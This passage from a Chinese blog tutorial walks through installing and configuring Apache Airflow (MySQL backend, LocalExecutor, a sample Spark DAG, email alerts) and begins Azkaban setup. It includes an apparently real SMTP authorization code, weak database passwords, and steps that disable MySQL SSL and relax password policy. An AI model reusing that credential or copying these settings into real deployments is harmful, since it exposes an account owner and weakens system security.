名词解释</h3><ul><li><strong>Dynamic</strong>：Airflow配置需要实用Python，允许动态生产管道。这允许编写可动态。这允许编写可动态实例化管道的代码</li><li><strong>Extensible</strong>：轻松定义自己的运算符，执行程序并扩展库，使其适合于您的环境</li><li><strong>Elegant</strong>：Airlfow是精简的，使用功能强大的Jinja模板引擎，将脚本参数化内置于Airflow的核心中</li><li><strong>Scalable</strong>：Airflow具有模板块架构，并使用消息队列来安排任意数量的工作任务</li></ul><h2 id="2、Airflow安装">2、Airflow安装</h2><h3 id="2-1-python环境安装">2.1 python环境安装</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Superset是由Python语言编写的Web应用，要求Python3.8的环境</span></span><br><span class="line"><span class="comment"># 这里使用MiniConda作为包管理器</span></span><br><span class="line"><span class="comment"># 下载地址：https://repo.anaconda.com/miniconda/Miniconda3-latest-Linux-x86_64.sh</span></span><br><span class="line">bash Miniconda3-latest-Linux-x86_64.sh</span><br><span class="line"><span class="comment"># 加载环境变量配置文件，使之生效</span></span><br><span class="line"><span class="built_in">source</span> ~/.bashrc</span><br><span class="line"><span class="comment"># Miniconda安装完成后，每次打开终端都会激活其默认的base环境，我们可通过以下命令，禁止激活默认base环境</span></span><br><span class="line">conda config --<span class="built_in">set</span> auto_activate_base <span class="literal">false</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 配置conda国内镜像</span></span><br><span class="line">conda config --add channels https://mirrors.tuna.tsinghua.edu.cn/anaconda/pkgs/free</span><br><span class="line">conda config --add channels https://mirrors.tuna.tsinghua.edu.cn/anaconda/pkgs/main</span><br><span class="line">conda config --<span class="built_in">set</span> show_channel_urls yes</span><br><span class="line"><span class="comment"># 创建Python3.8环境</span></span><br><span class="line">conda create --name airflow python=3.8</span><br><span class="line"><span class="comment"># 创建环境：conda create -n env_name</span></span><br><span class="line"><span class="comment"># 查看所有环境：conda info --envs</span></span><br><span class="line"><span class="comment"># 删除一个环境：conda remove -n env_name --all</span></span><br><span class="line"><span class="comment"># 激活airflow环境</span></span><br><span class="line">conda activate airflow</span><br><span class="line"><span class="comment"># 执行python -V命令查看python版本</span></span><br><span class="line">python -V</span><br></pre></td></tr></table></figure><h3 id="2-2-安装Airflow">2.2 安装Airflow</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">conda activate airflow</span><br><span class="line">pip install numpy -i https://pypi.tuna.tsinghua.edu.cn/simple</span><br><span class="line">sudo mkdir ~/.pip</span><br><span class="line">sudo vim  ~/.pip/pip.conf</span><br><span class="line"><span class="comment">#添加以下内容</span></span><br><span class="line">[global]</span><br><span class="line">index-url = https://pypi.tuna.tsinghua.edu.cn/simple</span><br><span class="line">[install]</span><br><span class="line">trusted-host = https://pypi.tuna.tsinghua.edu.cn</span><br><span class="line"><span class="comment"># 安装airflow</span></span><br><span class="line">pip install <span class="string">"apache-airflow==2.4.3"</span></span><br><span class="line"><span class="comment"># 初始化airflow</span></span><br><span class="line">airflow db init</span><br><span class="line"><span class="comment"># 查看版本</span></span><br><span class="line">airflow version</span><br><span class="line"><span class="comment"># airflow安装好存放路径</span></span><br><span class="line"><span class="built_in">pwd</span></span><br><span class="line"><span class="comment"># 启动airflow web服务,启动后浏览器访问http://hadoop102:8081</span></span><br><span class="line">airflow webserver -p 8081 -D</span><br><span class="line"><span class="comment"># 启动airflow调度</span></span><br><span class="line">airflow scheduler -D</span><br><span class="line"><span class="comment"># 创建账号</span></span><br><span class="line">airflow users create \</span><br><span class="line">--username admin \</span><br><span class="line">--firstname atguigu \</span><br><span class="line">--lastname atguigu \</span><br><span class="line">--role Admin \</span><br><span class="line">--email shawn@atguigu.com</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 启动停止脚本</span></span><br><span class="line">vim af.sh</span><br><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">case</span> <span class="variable">$1</span> <span class="keyword">in</span></span><br><span class="line"><span class="string">"start"</span>)&#123;</span><br><span class="line">    <span class="built_in">echo</span> <span class="string">" --------启动 airflow-------"</span></span><br><span class="line">    ssh hadoop102 <span class="string">"conda activate airflow;airflow webserver -p 8081 -D;airflow scheduler -D; conda deactivate"</span></span><br><span class="line">&#125;;;</span><br><span class="line"><span class="string">"stop"</span>)&#123;</span><br><span class="line">    <span class="built_in">echo</span> <span class="string">" --------关闭 airflow-------"</span></span><br><span class="line">    ps -ef|egrep <span class="string">'scheduler|airflow-webserver'</span>|grep -v grep|awk <span class="string">'&#123;print $2&#125;'</span>|xargs <span class="built_in">kill</span> -15 </span><br><span class="line">&#125;;;</span><br><span class="line"><span class="keyword">esac</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 添加权限即可使用</span></span><br><span class="line">chmod +x af.sh</span><br></pre></td></tr></table></figure><h2 id="3、修改数据库与调度器">3、修改数据库与调度器</h2><h3 id="3-1-修改数据库为mysql">3.1 修改数据库为mysql</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># https://airflow.apache.org/docs/apache-airflow/2.4.3/howto/set-up-database.html#setting-up-a-mysql-database</span></span><br><span class="line"><span class="comment"># 在MySQL中建库</span></span><br><span class="line">CREATE DATABASE airflow_db CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci;</span><br><span class="line"><span class="comment"># 如果报错Linux error:1425F102:SSL routines:ssl_choose_client_version:unsupported protocol，可以关闭MySQL的SSL证书</span></span><br><span class="line">SHOW VARIABLES LIKE <span class="string">'%ssl%'</span>;</span><br><span class="line"><span class="comment"># 修改配置文件my.cnf，加入以下内容</span></span><br><span class="line"><span class="comment"># disable_ssl</span></span><br><span class="line">skip_ssl</span><br><span class="line"></span><br><span class="line"><span class="comment"># 添加python连接的依赖：</span></span><br><span class="line">pip install mysql-connector-python</span><br><span class="line"><span class="comment"># 修改airflow的配置文件</span></span><br><span class="line">vim ~/airflow/airflow.cfg</span><br><span class="line">[database]</span><br><span class="line"><span class="comment"># The SqlAlchemy connection string to the metadata database.</span></span><br><span class="line"><span class="comment"># SqlAlchemy supports many different database engines.</span></span><br><span class="line"><span class="comment"># More information here:</span></span><br><span class="line"><span class="comment"># http://airflow.apache.org/docs/apache-airflow/stable/howto/set-up-database.html#database-uri</span></span><br><span class="line"><span class="comment">#sql_alchemy_conn = sqlite:////home/atguigu/airflow/airflow.db</span></span><br><span class="line">sql_alchemy_conn = mysql+mysqlconnector://root:123456@hadoop102:3306/airflow_db</span><br><span class="line"></span><br><span class="line"><span class="comment"># 关闭airflow，初始化后重启</span></span><br><span class="line">af.sh stop</span><br><span class="line">airflow db init</span><br><span class="line"><span class="comment"># 初始化报错1067 - Invalid default value for ‘update_at’</span></span><br><span class="line"><span class="comment"># 原因：字段 'update_at' 为 timestamp类型，取值范围是：1970-01-01 00:00:00 到 2037-12-31 23:59:59（UTC +8 北京时间从1970-01-01 08:00:00 开始），而这里默认给了空值，所以导致失败</span></span><br><span class="line"><span class="built_in">set</span> GLOBAL sql_mode=<span class="string">'STRICT_TRANS_TABLES,NO_AUTO_CREATE_USER,NO_ENGINE_SUBSTITUTION'</span>;</span><br><span class="line"><span class="comment"># 重启MySQL会造成参数失效，推荐将参数写入到配置文件my.cnf中</span></span><br><span class="line">sql_mode = STRICT_TRANS_TABLES,NO_AUTO_CREATE_USER,NO_ENGINE_SUBSTITUTION </span><br><span class="line"><span class="comment"># 重启</span></span><br><span class="line">af.sh start</span><br><span class="line"></span><br><span class="line"><span class="comment"># 重新创建账号登录</span></span><br><span class="line">airflow users create \</span><br><span class="line">--username admin \</span><br><span class="line">--firstname atguigu \</span><br><span class="line">--lastname atguigu \</span><br><span class="line">--role Admin \</span><br><span class="line">--email shawn@atguigu.com</span><br></pre></td></tr></table></figure><h3 id="3-2-修改执行器">3.2 修改执行器</h3><p>官网不推荐在开发中使用顺序执行器，会造成任务调度阻塞</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 修改airflow的配置文件</span></span><br><span class="line">[core]</span><br><span class="line"><span class="comment"># The executor class that airflow should use. Choices include</span></span><br><span class="line"><span class="comment"># ``SequentialExecutor``, ``LocalExecutor``, ``CeleryExecutor``, ``DaskExecutor``,</span></span><br><span class="line"><span class="comment"># ``KubernetesExecutor``, ``CeleryKubernetesExecutor`` or the</span></span><br><span class="line"><span class="comment"># full import path to the class when using a custom executor.</span></span><br><span class="line">executor = LocalExecutor</span><br><span class="line"></span><br><span class="line"><span class="comment"># dags_folder是保存文件位置</span></span><br></pre></td></tr></table></figure><h2 id="4、部署使用">4、部署使用</h2><blockquote><p>文档：<a href="https://airflow.apache.org/docs/apache-airflow/2.4.3/howto/index.html" target="_blank" rel="noopener" title="https://airflow.apache.org/docs/apache-airflow/2.4.3/howto/index.html">https://airflow.apache.org/docs/apache-airflow/2.4.3/howto/index.html</a></p></blockquote><h3 id="4-1-环境部署启动">4.1 环境部署启动</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 需要启动hadoop和spark的历史服务器</span></span><br><span class="line"><span class="comment"># 编写.py脚本，创建work-py目录用于存放python调度脚本</span></span><br><span class="line">mkdir ~/airflow/dags </span><br><span class="line"><span class="built_in">cd</span> dags/</span><br><span class="line">vim test.py</span><br></pre></td></tr></table></figure><p>编写脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="keyword">from</span> airflow <span class="keyword">import</span> DAG</span><br><span class="line"><span class="keyword">from</span> airflow.operators.bash_operator <span class="keyword">import</span> BashOperator</span><br><span class="line"><span class="keyword">from</span> datetime <span class="keyword">import</span> datetime, timedelta</span><br><span class="line"></span><br><span class="line">default_args = &#123;</span><br><span class="line">    <span class="comment"># 用户</span></span><br><span class="line">    <span class="string">'owner'</span>: <span class="string">'test_owner'</span>,</span><br><span class="line">    <span class="comment"># 是否开启任务依赖</span></span><br><span class="line">    <span class="string">'depends_on_past'</span>: <span class="literal">True</span>, </span><br><span class="line">    <span class="comment"># 邮箱</span></span><br><span class="line">    <span class="string">'email'</span>: [<span class="string">'403627000@qq.com'</span>],</span><br><span class="line">    <span class="comment"># 启动时间</span></span><br><span class="line">    <span class="string">'start_date'</span>:datetime(<span class="number">2022</span>,<span class="number">11</span>,<span class="number">28</span>),</span><br><span class="line">    <span class="comment"># 出错是否发邮件报警</span></span><br><span class="line">    <span class="string">'email_on_failure'</span>: <span class="literal">False</span>,</span><br><span class="line">    <span class="comment"># 重试是否发邮件报警</span></span><br><span class="line">    <span class="string">'email_on_retry'</span>: <span class="literal">False</span>,</span><br><span class="line">    <span class="comment"># 重试次数</span></span><br><span class="line">    <span class="string">'retries'</span>: <span class="number">1</span>,</span><br><span class="line">    <span class="comment"># 重试时间间隔</span></span><br><span class="line">    <span class="string">'retry_delay'</span>: timedelta(minutes=<span class="number">5</span>),</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment"># 声明任务图</span></span><br><span class="line">dag = DAG(<span class="string">'test'</span>, default_args=default_args, schedule_interval=timedelta(days=<span class="number">1</span>))</span><br><span class="line"> </span><br><span class="line"><span class="comment"># 创建单个任务</span></span><br><span class="line">t1 = BashOperator(</span><br><span class="line">    <span class="comment"># 任务id</span></span><br><span class="line">    task_id=<span class="string">'dwd'</span>,</span><br><span class="line">    <span class="comment"># 任务命令</span></span><br><span class="line">    bash_command=<span class="string">'ssh hadoop102 "/opt/module/spark-yarn/bin/spark-submit --class org.apache.spark.examples.SparkPi --master yarn /opt/module/spark-yarn/examples/jars/spark-examples_2.12-3.1.3.jar 10 "'</span>,</span><br><span class="line">    <span class="comment"># 重试次数</span></span><br><span class="line">    retries=<span class="number">3</span>,</span><br><span class="line">    <span class="comment"># 把任务添加进图中</span></span><br><span class="line">    dag=dag)</span><br><span class="line"></span><br><span class="line">t2 = BashOperator(</span><br><span class="line">    task_id=<span class="string">'dws'</span>,</span><br><span class="line">    bash_command=<span class="string">'ssh hadoop102 "/opt/module/spark-yarn/bin/spark-submit --class org.apache.spark.examples.SparkPi --master yarn /opt/module/spark-yarn/examples/jars/spark-examples_2.12-3.1.3.jar 10 "'</span>,</span><br><span class="line">    retries=<span class="number">3</span>,</span><br><span class="line">    dag=dag)</span><br><span class="line"></span><br><span class="line">t3 = BashOperator(</span><br><span class="line">    task_id=<span class="string">'ads'</span>,</span><br><span class="line">    bash_command=<span class="string">'ssh hadoop102 "/opt/module/spark-yarn/bin/spark-submit --class org.apache.spark.examples.SparkPi --master yarn /opt/module/spark-yarn/examples/jars/spark-examples_2.12-3.1.3.jar 10 "'</span>,</span><br><span class="line">    retries=<span class="number">3</span>,</span><br><span class="line">    dag=dag)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 设置任务依赖</span></span><br><span class="line">t2.set_upstream(t1)</span><br><span class="line">t3.set_upstream(t2)</span><br></pre></td></tr></table></figure><p>注意一些注意事项</p><ul><li><p>必须导包</p><p>from airflow import DAG</p><p>from airflow.operators.bash_operator import BashOperator</p></li><li><p>default_args 设置默认参数</p></li><li><p>depends_on_past 是否开启任务依赖</p></li><li><p>schedule_interval 调度频率</p></li><li><p>retries 重试次数 </p></li><li><p>start_date 开始时间</p></li><li><p>BashOperator 具体执行任务，如果为true前置任务必须成功完成才会走下一个依赖任务，如果为false则忽略是否成功完成</p></li><li><p>task_id 任务唯一标识（必填）</p></li><li><p>bash_command 具体任务执行命令</p></li><li><p>set_upstream 设置依赖</p></li></ul><h2 id="4-2-Dag任务操作">4.2 Dag任务操作</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 过段时间会加载</span></span><br><span class="line">airflow dags list</span><br><span class="line"><span class="comment"># 查看所有任务</span></span><br><span class="line">airflow list_dags </span><br><span class="line"><span class="comment"># 查看单个任务</span></span><br><span class="line">airflow tasks list <span class="built_in">test</span> --tree</span><br><span class="line"><span class="comment"># 如果删除的话需要UI和底层都删除才行</span></span><br></pre></td></tr></table></figure><h3 id="4-3-配置邮件服务器">4.3 配置邮件服务器</h3><p>修改airflow配置文件，用stmps服务对应587端口， </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">vim ~/airflow/airflow.cfg </span><br><span class="line">smtp_host = smtp.qq.com</span><br><span class="line">smtp_starttls = True</span><br><span class="line">smtp_ssl = False</span><br><span class="line">smtp_user = xx@qq.com</span><br><span class="line"><span class="comment"># smtp_user =</span></span><br><span class="line">smtp_password = qluxdbuhgrhgbigi</span><br><span class="line"><span class="comment"># smtp_password =</span></span><br><span class="line">smtp_port = 587</span><br><span class="line">smtp_mail_from = xx@qq.com</span><br><span class="line"></span><br><span class="line"><span class="comment"># 然后重启</span></span><br><span class="line">af.sh stop</span><br><span class="line">af.sh star</span><br><span class="line"><span class="comment"># 编辑test.py脚本，并且替换</span></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="keyword">from</span> airflow <span class="keyword">import</span> DAG</span><br><span class="line"><span class="keyword">from</span> airflow.operators.bash_operator <span class="keyword">import</span> BashOperator</span><br><span class="line"><span class="keyword">from</span> airflow.operators.email_operator <span class="keyword">import</span> EmailOperator</span><br><span class="line"><span class="keyword">from</span> datetime <span class="keyword">import</span> datetime, timedelta</span><br><span class="line"></span><br><span class="line">default_args = &#123;</span><br><span class="line">    <span class="comment"># 用户</span></span><br><span class="line">    <span class="string">'owner'</span>: <span class="string">'test_owner'</span>,</span><br><span class="line">    <span class="comment"># 是否开启任务依赖</span></span><br><span class="line">    <span class="string">'depends_on_past'</span>: <span class="literal">True</span>, </span><br><span class="line">    <span class="comment"># 邮箱</span></span><br><span class="line">    <span class="string">'email'</span>: [<span class="string">'xx@qq.com'</span>],</span><br><span class="line">    <span class="comment"># 启动时间</span></span><br><span class="line">    <span class="string">'start_date'</span>:datetime(<span class="number">2022</span>,<span class="number">11</span>,<span class="number">28</span>),</span><br><span class="line">    <span class="comment"># 出错是否发邮件报警</span></span><br><span class="line">    <span class="string">'email_on_failure'</span>: <span class="literal">False</span>,</span><br><span class="line">    <span class="comment"># 重试是否发邮件报警</span></span><br><span class="line">    <span class="string">'email_on_retry'</span>: <span class="literal">False</span>,</span><br><span class="line">    <span class="comment"># 重试次数</span></span><br><span class="line">    <span class="string">'retries'</span>: <span class="number">1</span>,</span><br><span class="line">    <span class="comment"># 重试时间间隔</span></span><br><span class="line">    <span class="string">'retry_delay'</span>: timedelta(minutes=<span class="number">5</span>),</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment"># 声明任务图</span></span><br><span class="line">dag = DAG(<span class="string">'test'</span>, default_args=default_args, schedule_interval=timedelta(days=<span class="number">1</span>))</span><br><span class="line"> </span><br><span class="line"><span class="comment"># 创建单个任务</span></span><br><span class="line">t1 = BashOperator(</span><br><span class="line">    <span class="comment"># 任务id</span></span><br><span class="line">    task_id=<span class="string">'dwd'</span>,</span><br><span class="line">    <span class="comment"># 任务命令</span></span><br><span class="line">    bash_command=<span class="string">'ssh hadoop102 "/opt/module/spark-yarn/bin/spark-submit --class org.apache.spark.examples.SparkPi --master yarn /opt/module/spark-yarn/examples/jars/spark-examples_2.12-3.1.3.jar 10 "'</span>,</span><br><span class="line">    <span class="comment"># 重试次数</span></span><br><span class="line">    retries=<span class="number">3</span>,</span><br><span class="line">    <span class="comment"># 把任务添加进图中</span></span><br><span class="line">    dag=dag)</span><br><span class="line"></span><br><span class="line">t2 = BashOperator(</span><br><span class="line">    task_id=<span class="string">'dws'</span>,</span><br><span class="line">    bash_command=<span class="string">'ssh hadoop102 "/opt/module/spark-yarn/bin/spark-submit --class org.apache.spark.examples.SparkPi --master yarn /opt/module/spark-yarn/examples/jars/spark-examples_2.12-3.1.3.jar 10 "'</span>,</span><br><span class="line">    retries=<span class="number">3</span>,</span><br><span class="line">    dag=dag)</span><br><span class="line"></span><br><span class="line">t3 = BashOperator(</span><br><span class="line">    task_id=<span class="string">'ads'</span>,</span><br><span class="line">    bash_command=<span class="string">'ssh hadoop102 "/opt/module/spark-yarn/bin/spark-submit --class org.apache.spark.examples.SparkPi --master yarn /opt/module/spark-yarn/examples/jars/spark-examples_2.12-3.1.3.jar 10 "'</span>,</span><br><span class="line">    retries=<span class="number">3</span>,</span><br><span class="line">    dag=dag)</span><br><span class="line"></span><br><span class="line">email=EmailOperator(</span><br><span class="line">   task_id=<span class="string">"email"</span>,</span><br><span class="line">   to=<span class="string">"yaohm163@163.com "</span>,</span><br><span class="line">    subject=<span class="string">"test-subject"</span>,</span><br><span class="line">    html_content=<span class="string">"&lt;h1&gt;test-content&lt;/h1&gt;"</span>,</span><br><span class="line">    cc=<span class="string">"xx@qq.com "</span>,</span><br><span class="line">   dag=dag)</span><br><span class="line"></span><br><span class="line">t2.set_upstream(t1)</span><br><span class="line">t3.set_upstream(t2)</span><br><span class="line">email.set_upstream(t3)</span><br></pre></td></tr></table></figure><h1>四、Azkaban</h1><blockquote><p>azkaban官网：<a href="https://azkaban.github.io/downloads.html" target="_blank" rel="noopener" title="https://azkaban.github.io/downloads.html">https://azkaban.github.io/downloads.html</a></p></blockquote><h2 id="1、Azkaban入门">1、Azkaban入门</h2><h3 id="1-1-上传jar包和配置sql">1.1 上传jar包和配置sql</h3><p>首先获取azkaban的三个包，可以自行编译，<a href="https://github.com/azkaban/azkaban" target="_blank" rel="noopener" title="github地址">github地址</a></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># https://pan.baidu.com/s/10zD2Y_h0oB_rC-BAjLal1g%C2%A0  密码：zsxa</span></span><br><span class="line"><span class="comment"># 将azkaban-db-3.84.4.tar.gz，azkaban-exec-server-3.84.4.tar.gz，azkaban-web-server-3.84.4.tar.gz上传到hadoop102的/opt/software路径</span></span><br><span class="line"><span class="comment"># 新建/opt/module/azkaban目录，并将所有tar包解压到这个目录下</span></span><br><span class="line">mkdir /opt/module/azkaban</span><br><span class="line"><span class="comment"># 解压</span></span><br><span class="line">tar -zxvf azkaban-db-3.84.4.tar.gz -C /opt/module/azkaban/</span><br><span class="line">tar -zxvf azkaban-exec-server-3.84.4.tar.gz -C /opt/module/azkaban/</span><br><span class="line">tar -zxvf azkaban-web-server-3.84.4.tar.gz -C /opt/module/azkaban/</span><br><span class="line"><span class="comment"># 进入到/opt/module/azkaban目录，依次修改名称</span></span><br><span class="line">mv azkaban-exec-server-3.84.4/ azkaban-exec</span><br><span class="line">mv azkaban-web-server-3.84.4/ azkaban-web</span><br><span class="line"></span><br><span class="line"><span class="comment"># ==============然后配置mysql=====================</span></span><br><span class="line">mysql -uroot -p123456</span><br><span class="line"><span class="comment"># 登陆MySQL，创建Azkaban数据库</span></span><br><span class="line">create database azkaban;</span><br><span class="line"><span class="comment"># 创建azkaban用户并赋予权限</span></span><br><span class="line"><span class="built_in">set</span> global validate_password_length=4;</span><br><span class="line"><span class="built_in">set</span> global validate_password_policy=0;</span><br><span class="line">CREATE USER <span class="string">'azkaban'</span>@<span class="string">'%'</span> IDENTIFIED BY <span class="string">'000000'</span>;</span><br><span class="line"><span class="comment"># 赋予Azkaban用户增删改查权限 </span></span><br><span class="line">GRANT SELECT,INSERT,UPDATE,DELETE ON azkaban.* to <span class="string">'azkaban'</span>@<span class="string">'%'</span> WITH GRANT OPTION;</span><br><span class="line"><span class="comment"># 创建Azkaban表，完成后退出MySQL</span></span><br><span class="line">use azkaban;</span><br><span class="line"><span class="built_in">source</span> /opt/module/azkaban/azkaban-db-3.84.4/create-all-sql-3.84.4.sql</span><br><span class="line">quit;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 更改MySQL包大小；防止Azkaban连接MySQL阻塞</span></span><br><span class="line">sudo vim /etc/my.cnf</span><br><span class="line"><span class="comment"># 在[mysqld]下面加一行max_allowed_packet=1024M</span></span><br><span class="line">[mysqld]</span><br><span class="line">max_allowed_packet=1024M</span><br><span class="line"><span class="comment"># 重启MySQL</span></span><br><span class="line">sudo systemctl restart mysqld</span><br></pre></td></tr></table></figure><h3 id="1-2-配置Executor-Server">1.2 配置Executor Server</h3><p>Azkaban Executor Server处理工作流和作业的实际执行</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 编辑azkaban.properties</span></span><br><span class="line">vim 